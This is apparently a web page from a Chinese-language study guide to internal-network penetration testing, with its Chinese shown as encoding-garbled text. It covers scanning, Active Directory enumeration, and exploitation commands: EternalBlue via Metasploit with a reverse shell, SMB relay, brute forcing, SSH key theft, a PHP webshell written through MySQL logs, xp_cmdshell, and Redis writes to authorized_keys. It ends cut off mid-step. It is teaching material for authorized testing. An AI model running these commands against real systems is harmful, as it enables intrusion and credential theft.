<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>å†…ç½‘æ¸—é€å®Œæ•´å­¦ä¹ æŒ‡å— - å¼€å‘</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="../../highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="../../tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../theme/pagetoc.css">
        <link rel="stylesheet" href="../../theme/help-overlay.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "../../";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "../../searchindex.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>â†</kbd> or <kbd>â†’</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">å¼€å‘</h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="searchbar" name="searchbar" placeholder="æœç´¢æœ¬ä¹¦å†…å®¹..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <i class="fa fa-spinner fa-spin"></i>
                            </div>
                        </div>
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <!-- Page table of contents -->
                        <div class="sidetoc"><nav class="pagetoc"></nav></div>

                        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css">
<h1 id="å†…ç½‘æ¸—é€å®Œæ•´å­¦ä¹ æŒ‡å—"><a class="header" href="#å†…ç½‘æ¸—é€å®Œæ•´å­¦ä¹ æŒ‡å—">å†…ç½‘æ¸—é€å®Œæ•´å­¦ä¹ æŒ‡å—</a></h1>
<h2 id="-å­¦ä¹ è·¯çº¿å›¾"><a class="header" href="#-å­¦ä¹ è·¯çº¿å›¾">ğŸ“‹ å­¦ä¹ è·¯çº¿å›¾</a></h2>
<pre><code>ç½‘ç»œåŸºç¡€(2å‘¨) â†’ ä¿¡æ¯æ”¶é›†(2å‘¨) â†’ æ¼æ´åˆ©ç”¨(3å‘¨) â†’ æƒé™æå‡(2å‘¨) â†’ æ¨ªå‘ç§»åŠ¨(3å‘¨) â†’ æŒä¹…åŒ–(1å‘¨) â†’ é˜²å¾¡å¯¹æŠ—(2å‘¨) â†’ å®æˆ˜æ¼”ç»ƒ(æŒç»­)
</code></pre>
<h2 id="-æ³•å¾‹å£°æ˜ä¸é“å¾·å‡†åˆ™"><a class="header" href="#-æ³•å¾‹å£°æ˜ä¸é“å¾·å‡†åˆ™">âš–ï¸ æ³•å¾‹å£°æ˜ä¸é“å¾·å‡†åˆ™</a></h2>
<blockquote>
<p><strong>ä¸¥æ­£å£°æ˜</strong>: å†…ç½‘æ¸—é€å¿…é¡»åœ¨è·å¾—æ˜ç¡®ä¹¦é¢æˆæƒçš„å‰æä¸‹è¿›è¡Œï¼</p>
</blockquote>
<h3 id="åˆæ³•ä½¿ç”¨åœºæ™¯"><a class="header" href="#åˆæ³•ä½¿ç”¨åœºæ™¯">åˆæ³•ä½¿ç”¨åœºæ™¯</a></h3>
<ul>
<li>âœ… ä¼ä¸šæˆæƒçš„å†…éƒ¨å®‰å…¨è¯„ä¼°</li>
<li>âœ… çº¢è“å¯¹æŠ—æ¼”ç»ƒï¼ˆåŒæ–¹ç­¾ç½²æˆæƒåè®®ï¼‰</li>
<li>âœ… å®‰å…¨ç«èµ›ä¸CTFç¯å¢ƒ</li>
<li>âœ… è‡ªå»ºå®éªŒå®¤ç¯å¢ƒæµ‹è¯•</li>
</ul>
<h3 id="ä¸¥æ ¼ç¦æ­¢"><a class="header" href="#ä¸¥æ ¼ç¦æ­¢">ä¸¥æ ¼ç¦æ­¢</a></h3>
<ul>
<li>âŒ æœªç»æˆæƒè®¿é—®ä»»ä½•å†…ç½‘ç³»ç»Ÿ</li>
<li>âŒ çªƒå–ã€ç¯¡æ”¹ã€åˆ é™¤ä¼ä¸šæ•°æ®</li>
<li>âŒ ç ´åç”Ÿäº§ç¯å¢ƒå’Œä¸šåŠ¡ç³»ç»Ÿ</li>
<li>âŒ åˆ©ç”¨å†…ç½‘æ¼æ´è¿›è¡Œå‹’ç´¢ã€æ•²è¯ˆ</li>
</ul>
<h3 id="æˆæƒæ–‡ä»¶å¿…å¤‡è¦ç´ "><a class="header" href="#æˆæƒæ–‡ä»¶å¿…å¤‡è¦ç´ ">æˆæƒæ–‡ä»¶å¿…å¤‡è¦ç´ </a></h3>
<ul>
<li>æ˜ç¡®çš„æµ‹è¯•èŒƒå›´å’ŒIPæ®µ</li>
<li>æµ‹è¯•æ—¶é—´çª—å£</li>
<li>ç¦æ­¢æ“ä½œæ¸…å•</li>
<li>ç´§æ€¥è”ç³»äººå’Œåœæ­¢æœºåˆ¶</li>
<li>åŒæ–¹ç­¾å­—ç›–ç« çš„æ­£å¼æ–‡ä»¶</li>
</ul>
<hr />
<h2 id="1-åŸºç¡€çŸ¥è¯†ä½“ç³»"><a class="header" href="#1-åŸºç¡€çŸ¥è¯†ä½“ç³»">1. åŸºç¡€çŸ¥è¯†ä½“ç³»</a></h2>
<h3 id="11-ç½‘ç»œåŸºç¡€æ·±å…¥"><a class="header" href="#11-ç½‘ç»œåŸºç¡€æ·±å…¥">1.1 ç½‘ç»œåŸºç¡€æ·±å…¥</a></h3>
<h4 id="tcpipåè®®æ ˆ"><a class="header" href="#tcpipåè®®æ ˆ">TCP/IPåè®®æ ˆ</a></h4>
<p><strong>å››å±‚æ¨¡å‹</strong>:</p>
<pre><code>åº”ç”¨å±‚: HTTPã€DNSã€SMBã€RDPã€SSH
ä¼ è¾“å±‚: TCPã€UDP
ç½‘ç»œå±‚: IPã€ICMPã€ARP
é“¾è·¯å±‚: Ethernetã€VLAN
</code></pre>
<p><strong>å…³é”®åè®®ç‰¹æ€§</strong>:</p>
<pre><code class="language-python"># TCPä¸‰æ¬¡æ¡æ‰‹æµç¨‹
å®¢æˆ·ç«¯ -&gt; [SYN] -&gt; æœåŠ¡å™¨
å®¢æˆ·ç«¯ &lt;- [SYN+ACK] &lt;- æœåŠ¡å™¨
å®¢æˆ·ç«¯ -&gt; [ACK] -&gt; æœåŠ¡å™¨

# å†…ç½‘æ¸—é€ä¸­çš„åº”ç”¨
- ç«¯å£æ‰«æ: SYNæ‰«æã€ACKæ‰«æ
- é˜²ç«å¢™æ£€æµ‹: TCPæ ‡å¿—ä½æ“ä½œ
- éš§é“å»ºç«‹: TCPåå‘è¿æ¥
</code></pre>
<h4 id="ç½‘ç»œæ‹“æ‰‘è¯†åˆ«"><a class="header" href="#ç½‘ç»œæ‹“æ‰‘è¯†åˆ«">ç½‘ç»œæ‹“æ‰‘è¯†åˆ«</a></h4>
<p><strong>å­ç½‘åˆ’åˆ†è®¡ç®—</strong>:</p>
<pre><code class="language-bash"># CIDRè¡¨ç¤ºæ³•
192.168.1.0/24    # 256ä¸ªIP (254å¯ç”¨)
10.0.0.0/8        # 16,777,216ä¸ªIP
172.16.0.0/16     # 65,536ä¸ªIP

# å­ç½‘æ©ç è®¡ç®—
/24 = 255.255.255.0
/16 = 255.255.0.0
/8  = 255.0.0.0
</code></pre>
<p><strong>ç½‘å…³å’Œè·¯ç”±å‘ç°</strong>:</p>
<pre><code class="language-bash"># Windows
route print
arp -a
ipconfig /all

# Linux
ip route
ip neigh
netstat -rn

# è¯†åˆ«å¤šç½‘å¡ä¸»æœºï¼ˆè·³æ¿æœºï¼‰
ip addr show
ifconfig -a
</code></pre>
<h4 id="vlanä¸ç½‘æ®µéš”ç¦»"><a class="header" href="#vlanä¸ç½‘æ®µéš”ç¦»">VLANä¸ç½‘æ®µéš”ç¦»</a></h4>
<p><strong>VLANåŸç†</strong>:</p>
<pre><code>VLAN 10: è´¢åŠ¡éƒ¨é—¨ (172.16.10.0/24)
VLAN 20: ç ”å‘éƒ¨é—¨ (172.16.20.0/24)
VLAN 30: è¿ç»´éƒ¨é—¨ (172.16.30.0/24)
VLAN 99: ç®¡ç†VLAN (172.16.99.0/24)
</code></pre>
<p><strong>è·¨VLANæ”»å‡»æ–¹æ³•</strong>:</p>
<pre><code class="language-bash"># VLAN Hopping (åŒé‡æ ‡ç­¾)
# åˆ©ç”¨Trunkç«¯å£é…ç½®é”™è¯¯
# é€šè¿‡è·¯ç”±å™¨/ä¸‰å±‚äº¤æ¢æœº
# å¯»æ‰¾å¤šç½‘å¡ä¸»æœºä½œä¸ºè·³æ¿
</code></pre>
<h3 id="12-æ“ä½œç³»ç»ŸåŸºç¡€"><a class="header" href="#12-æ“ä½œç³»ç»ŸåŸºç¡€">1.2 æ“ä½œç³»ç»ŸåŸºç¡€</a></h3>
<h4 id="windowså†…æ ¸æœºåˆ¶"><a class="header" href="#windowså†…æ ¸æœºåˆ¶">Windowså†…æ ¸æœºåˆ¶</a></h4>
<p><strong>æ ¸å¿ƒç»„ä»¶</strong>:</p>
<pre><code>User Mode (ç”¨æˆ·æ€):
â”œâ”€â”€ Win32 åº”ç”¨ç¨‹åº
â”œâ”€â”€ Windowså­ç³»ç»Ÿ
â””â”€â”€ POSIXå­ç³»ç»Ÿ

Kernel Mode (å†…æ ¸æ€):
â”œâ”€â”€ Executive (æ‰§è¡Œä½“)
â”œâ”€â”€ Kernel (å†…æ ¸)
â”œâ”€â”€ Hardware Abstraction Layer (HAL)
â””â”€â”€ Device Drivers (è®¾å¤‡é©±åŠ¨)
</code></pre>
<p><strong>æƒé™æ¨¡å‹</strong>:</p>
<pre><code>æƒé™ç­‰çº§:
SYSTEM          # æœ€é«˜æƒé™
Administrator   # ç®¡ç†å‘˜
User            # æ™®é€šç”¨æˆ·
Guest           # è®¿å®¢

åŸŸç¯å¢ƒæƒé™:
Domain Admin            # åŸŸç®¡ç†å‘˜
Enterprise Admin        # ä¼ä¸šç®¡ç†å‘˜
Schema Admin           # æ¶æ„ç®¡ç†å‘˜
Domain User            # åŸŸç”¨æˆ·
</code></pre>
<p><strong>è¿›ç¨‹å’ŒæœåŠ¡</strong>:</p>
<pre><code class="language-powershell"># æŸ¥çœ‹è¿›ç¨‹
Get-Process
tasklist /v

# æŸ¥çœ‹æœåŠ¡
Get-Service
sc query

# æŸ¥çœ‹å¯åŠ¨é¡¹
Get-WmiObject Win32_StartupCommand
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</code></pre>
<h4 id="linuxç³»ç»Ÿæ¶æ„"><a class="header" href="#linuxç³»ç»Ÿæ¶æ„">Linuxç³»ç»Ÿæ¶æ„</a></h4>
<p><strong>ç›®å½•ç»“æ„</strong>:</p>
<pre><code>/bin        # åŸºæœ¬å‘½ä»¤
/sbin       # ç³»ç»Ÿç®¡ç†å‘½ä»¤
/etc        # é…ç½®æ–‡ä»¶
/var        # å¯å˜æ•°æ®ï¼ˆæ—¥å¿—ï¼‰
/tmp        # ä¸´æ—¶æ–‡ä»¶
/home       # ç”¨æˆ·ä¸»ç›®å½•
/root       # rootç”¨æˆ·ä¸»ç›®å½•
/usr        # ç”¨æˆ·ç¨‹åº
</code></pre>
<p><strong>æƒé™æ¨¡å‹</strong>:</p>
<pre><code class="language-bash"># æ–‡ä»¶æƒé™
rwxrwxrwx = 777
- æ‰€æœ‰è€… | ç»„ | å…¶ä»–ç”¨æˆ·

# ç‰¹æ®Šæƒé™
SUID (4000): ä»¥æ–‡ä»¶æ‰€æœ‰è€…èº«ä»½æ‰§è¡Œ
SGID (2000): ä»¥æ–‡ä»¶æ‰€å±ç»„èº«ä»½æ‰§è¡Œ
Sticky Bit (1000): ä»…æ‰€æœ‰è€…å¯åˆ é™¤

# æŸ¥çœ‹SUIDç¨‹åº
find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -2000 -type f 2&gt;/dev/null
</code></pre>
<hr />
<h2 id="2-ä¿¡æ¯æ”¶é›†æŠ€æœ¯"><a class="header" href="#2-ä¿¡æ¯æ”¶é›†æŠ€æœ¯">2. ä¿¡æ¯æ”¶é›†æŠ€æœ¯</a></h2>
<h3 id="21-ä¸»æœºå‘ç°"><a class="header" href="#21-ä¸»æœºå‘ç°">2.1 ä¸»æœºå‘ç°</a></h3>
<h4 id="icmpæ‰«æ"><a class="header" href="#icmpæ‰«æ">ICMPæ‰«æ</a></h4>
<pre><code class="language-bash"># Pingæ‰«æ
nmap -sn 192.168.1.0/24

# æ‰¹é‡pingï¼ˆWindowsï¼‰
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL="

# æ‰¹é‡pingï¼ˆLinuxï¼‰
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" &amp; done
</code></pre>
<h4 id="arpæ‰«æ"><a class="header" href="#arpæ‰«æ">ARPæ‰«æ</a></h4>
<pre><code class="language-bash"># Nmap ARPæ‰«æï¼ˆæœ¬åœ°ç½‘æ®µï¼‰
nmap -PR 192.168.1.0/24

# arp-scanå·¥å…·
arp-scan -l
arp-scan --interface=eth0 192.168.1.0/24

# NetDiscover
netdiscover -r 192.168.1.0/24 -i eth0

# æ‰‹å·¥ARPè¯·æ±‚
arping -c 3 192.168.1.1
</code></pre>
<h4 id="tcpudpç«¯å£æ‰«æ"><a class="header" href="#tcpudpç«¯å£æ‰«æ">TCP/UDPç«¯å£æ‰«æ</a></h4>
<p><strong>å¸¸è§å†…ç½‘æœåŠ¡ç«¯å£</strong>:</p>
<pre><code>21    - FTP
22    - SSH
23    - Telnet
25    - SMTP
53    - DNS
80    - HTTP
88    - Kerberos
135   - MS RPC
139   - NetBIOS
389   - LDAP
443   - HTTPS
445   - SMB
1433  - MSSQL
1521  - Oracle
3306  - MySQL
3389  - RDP
5432  - PostgreSQL
5900  - VNC
6379  - Redis
8080  - HTTP Proxy
27017 - MongoDB
</code></pre>
<p><strong>å¿«é€Ÿæ‰«æç­–ç•¥</strong>:</p>
<pre><code class="language-bash"># å¿«é€Ÿæ‰«æå¸¸ç”¨ç«¯å£
nmap -p 21,22,23,80,443,445,3389,3306,1433 192.168.1.0/24 -T4 --open

# å…¨ç«¯å£æ‰«æ
masscan -p1-65535 192.168.1.0/24 --rate=10000

# Top 1000ç«¯å£
nmap -sS --top-ports 1000 192.168.1.0/24

# UDPæœåŠ¡æ‰«æ
nmap -sU -p 53,161,162,500 192.168.1.0/24
</code></pre>
<h3 id="22-ç«¯å£æœåŠ¡æ‰«æ"><a class="header" href="#22-ç«¯å£æœåŠ¡æ‰«æ">2.2 ç«¯å£æœåŠ¡æ‰«æ</a></h3>
<h4 id="nmapé«˜çº§æŠ€å·§"><a class="header" href="#nmapé«˜çº§æŠ€å·§">Nmapé«˜çº§æŠ€å·§</a></h4>
<p><strong>è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰</strong>:</p>
<pre><code class="language-bash"># æ¼æ´æ‰«æ
nmap --script=vuln 192.168.1.10

# SMBæ¼æ´æ£€æµ‹
nmap -p 445 --script smb-vuln-* 192.168.1.10

# å¼±å¯†ç çˆ†ç ´
nmap -p 22 --script ssh-brute 192.168.1.10
nmap -p 3306 --script mysql-brute 192.168.1.10

# ä¿¡æ¯æ³„éœ²
nmap -p 80 --script http-enum 192.168.1.10
nmap -p 445 --script smb-enum-shares 192.168.1.10

# è¯¦ç»†æœåŠ¡è¯†åˆ«
nmap -sV -p- --version-all 192.168.1.10
</code></pre>
<p><strong>æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«</strong>:</p>
<pre><code class="language-bash"># OSæ£€æµ‹
nmap -O 192.168.1.10

# è¯¦ç»†OSä¿¡æ¯
nmap -A 192.168.1.10

# TTLå€¼åˆ¤æ–­
# 64  - Linux
# 128 - Windows
# 255 - ç½‘ç»œè®¾å¤‡
</code></pre>
<h3 id="23-åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†"><a class="header" href="#23-åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†">2.3 åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†</a></h3>
<h4 id="åŸŸæ§åˆ¶å™¨å®šä½"><a class="header" href="#åŸŸæ§åˆ¶å™¨å®šä½">åŸŸæ§åˆ¶å™¨å®šä½</a></h4>
<p><strong>DNSæŸ¥è¯¢æ–¹æ³•</strong>:</p>
<pre><code class="language-bash"># æŸ¥è¯¢åŸŸæ§åˆ¶å™¨
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com

# æŸ¥è¯¢æ‰€æœ‰DC
nltest /dclist:domain.com

# æŸ¥è¯¢ä¸»åŸŸæ§
nltest /dsgetdc:domain.com

# PowerShellæŸ¥è¯¢
Get-ADDomainController -Filter *
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
</code></pre>
<p><strong>NetBIOSæŸ¥è¯¢</strong>:</p>
<pre><code class="language-bash"># æŸ¥è¯¢åŸŸæ§
net group "Domain Controllers" /domain

# æŸ¥è¯¢åŸŸä¿¡æ¯
net view /domain
net view /domain:WORKGROUP
</code></pre>
<h4 id="åŸŸç”¨æˆ·æšä¸¾"><a class="header" href="#åŸŸç”¨æˆ·æšä¸¾">åŸŸç”¨æˆ·æšä¸¾</a></h4>
<p><strong>LDAPæŸ¥è¯¢</strong>:</p>
<pre><code class="language-bash"># æšä¸¾æ‰€æœ‰ç”¨æˆ·
ldapsearch -x -h dc.domain.com -b "dc=domain,dc=com" "(objectClass=user)"

# æŸ¥è¯¢ç®¡ç†å‘˜ç»„
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# PowerViewæšä¸¾
Get-NetUser
Get-NetUser -AdminCount
Get-NetGroup "Domain Admins"
</code></pre>
<p><strong>Kerberosæšä¸¾</strong>:</p>
<pre><code class="language-bash"># ç”¨æˆ·åæšä¸¾ï¼ˆAS-REP Roastingï¼‰
GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request

# æœåŠ¡è´¦æˆ·æšä¸¾
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.com/user:password
</code></pre>
<h4 id="åŸŸä¿¡ä»»å…³ç³»åˆ†æ"><a class="header" href="#åŸŸä¿¡ä»»å…³ç³»åˆ†æ">åŸŸä¿¡ä»»å…³ç³»åˆ†æ</a></h4>
<pre><code class="language-powershell"># æŸ¥è¯¢ä¿¡ä»»å…³ç³»
nltest /domain_trusts
Get-ADTrust -Filter *

# æŸ¥è¯¢æ—ä¿¡ä»»
Get-ADForest | Select-Object Domains

# æšä¸¾è·¨åŸŸæƒé™
Find-ForeignUser
Find-ForeignGroup
</code></pre>
<h4 id="gpoç­–ç•¥æ”¶é›†"><a class="header" href="#gpoç­–ç•¥æ”¶é›†">GPOç­–ç•¥æ”¶é›†</a></h4>
<pre><code class="language-powershell"># æšä¸¾æ‰€æœ‰GPO
Get-GPO -All

# æŸ¥æ‰¾GPOä¸­çš„å¯†ç 
Get-GPPPassword

# æŸ¥è¯¢åº”ç”¨çš„GPO
gpresult /R
gpresult /H report.html

# å¯¼å‡ºGPOé…ç½®
Get-GPOReport -All -ReportType HTML -Path gpo_report.html
</code></pre>
<hr />
<h2 id="3-æ¼æ´å‘ç°ä¸åˆ©ç”¨"><a class="header" href="#3-æ¼æ´å‘ç°ä¸åˆ©ç”¨">3. æ¼æ´å‘ç°ä¸åˆ©ç”¨</a></h2>
<h3 id="31-å†…ç½‘webåº”ç”¨æ¼æ´"><a class="header" href="#31-å†…ç½‘webåº”ç”¨æ¼æ´">3.1 å†…ç½‘Webåº”ç”¨æ¼æ´</a></h3>
<p><strong>å†…ç½‘åº”ç”¨ç‰¹ç‚¹</strong>:</p>
<pre><code>- å®‰å…¨é˜²æŠ¤è¾ƒå¼±ï¼ˆæ— WAFï¼‰
- å­˜åœ¨é»˜è®¤å¯†ç 
- ç‰ˆæœ¬é™ˆæ—§æœªæ‰“è¡¥ä¸
- å¼€å‘æµ‹è¯•ç¯å¢ƒæš´éœ²
</code></pre>
<p><strong>å¸¸è§æ¼æ´</strong>:</p>
<pre><code class="language-bash"># æœªæˆæƒè®¿é—®
JenkinsæœªæˆæƒRCE
Tomcat Managerå¼±å¯†ç 
phpMyAdminé»˜è®¤å¯†ç 

# é…ç½®é”™è¯¯
.gitç›®å½•æ³„éœ²
.svnç›®å½•æ³„éœ²
å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼ˆ.bak, .old, .zipï¼‰

# æ¡†æ¶æ¼æ´
Struts2 RCE
Weblogicååºåˆ—åŒ–
ThinkPHP RCE
</code></pre>
<h3 id="32-ç³»ç»ŸæœåŠ¡æ¼æ´åˆ©ç”¨"><a class="header" href="#32-ç³»ç»ŸæœåŠ¡æ¼æ´åˆ©ç”¨">3.2 ç³»ç»ŸæœåŠ¡æ¼æ´åˆ©ç”¨</a></h3>
<h4 id="smbæ¼æ´åˆ©ç”¨"><a class="header" href="#smbæ¼æ´åˆ©ç”¨">SMBæ¼æ´åˆ©ç”¨</a></h4>
<p><strong>EternalBlue (MS17-010)</strong>:</p>
<pre><code class="language-bash"># æ¼æ´æ£€æµ‹
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Metasploitåˆ©ç”¨
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
</code></pre>
<p><strong>SMBä¸­ç»§æ”»å‡»</strong>:</p>
<pre><code class="language-bash"># Responderæ•è·å“ˆå¸Œ
responder -I eth0 -wrf

# ntlmrelayxä¸­ç»§
ntlmrelayx.py -t 192.168.1.20 -smb2support

# MultiRelayé…ç½®
python MultiRelay.py -t 192.168.1.20 -u ALL
</code></pre>
<h4 id="rdpæ¼æ´åˆ©ç”¨"><a class="header" href="#rdpæ¼æ´åˆ©ç”¨">RDPæ¼æ´åˆ©ç”¨</a></h4>
<p><strong>BlueKeep (CVE-2019-0708)</strong>:</p>
<pre><code class="language-bash"># æ¼æ´æ‰«æ
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.0/24

# Metasploitæ£€æµ‹
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.0/24
run

# æš´åŠ›ç ´è§£
crowbar -b rdp -s 192.168.1.10/32 -u admin -C passwords.txt
hydra -l administrator -P passwords.txt rdp://192.168.1.10
</code></pre>
<h4 id="sshæ¼æ´åˆ©ç”¨"><a class="header" href="#sshæ¼æ´åˆ©ç”¨">SSHæ¼æ´åˆ©ç”¨</a></h4>
<p><strong>å¼±å¯†ç çˆ†ç ´</strong>:</p>
<pre><code class="language-bash"># Hydraçˆ†ç ´
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Medusaçˆ†ç ´
medusa -h 192.168.1.10 -u root -P passwords.txt -M ssh

# å­—å…¸ç”Ÿæˆ
cewl http://company.com -w wordlist.txt
crunch 8 12 -t root%%%% -o passwords.txt
</code></pre>
<p><strong>SSHå¯†é’¥çªƒå–</strong>:</p>
<pre><code class="language-bash"># æŸ¥æ‰¾ç§é’¥
find / -name id_rsa 2&gt;/dev/null
find / -name id_dsa 2&gt;/dev/null
find /home -name authorized_keys 2&gt;/dev/null

# ä½¿ç”¨çªƒå–çš„å¯†é’¥
chmod 600 id_rsa
ssh -i id_rsa user@192.168.1.10
</code></pre>
<h4 id="æ•°æ®åº“æœåŠ¡æ¼æ´"><a class="header" href="#æ•°æ®åº“æœåŠ¡æ¼æ´">æ•°æ®åº“æœåŠ¡æ¼æ´</a></h4>
<p><strong>MySQLææƒ</strong>:</p>
<pre><code class="language-sql">-- UDFææƒ
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.dll';
SELECT sys_exec('whoami');

-- æ—¥å¿—å†™å…¥Webshell
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'C:/inetpub/wwwroot/shell.php';
SELECT '&lt;?php eval($_POST["cmd"]); ?&gt;';
</code></pre>
<p><strong>MSSQLåˆ©ç”¨</strong>:</p>
<pre><code class="language-sql">-- xp_cmdshellæ‰§è¡Œå‘½ä»¤
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- OLE Automationæ‰§è¡Œ
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', NULL, 'cmd.exe /c whoami';
</code></pre>
<p><strong>Redisæœªæˆæƒè®¿é—®</strong>:</p>
<pre><code class="language-bash"># å†™å…¥SSHå…¬é’¥
redis-cli -h 192.168.1.10
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# å†™å…¥Crontab
config set dir /var/spool/cron
